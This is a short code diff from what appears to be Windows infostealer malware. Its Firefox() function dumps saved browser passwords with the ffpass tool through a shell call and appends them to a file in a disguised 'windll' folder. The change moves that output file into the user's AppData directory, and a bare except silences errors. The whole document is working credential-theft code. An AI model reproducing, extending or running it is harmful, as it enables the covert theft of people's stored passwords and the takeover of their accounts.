@@ -16,6 +16,7 @@ import ffpass
 
 def Firefox():
     try:
+        path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
         mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
         profile = configparser.ConfigParser()
@@ -24,7 +25,7 @@ def Firefox():
         subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
         subprocess_return = subprocesss.stdout.read()
         passwords = str(subprocess_return)
-        with open(r'C:\windll\Browsers\Firefox\fox.txt', "a", encoding="utf-8") as file:
+        with open(rf'{path}\windll\Browsers\Firefox\firefox.txt', "a", encoding="utf-8") as file:
             file.write(passwords.replace('\\r', '\n'))
             file.close()
     except:
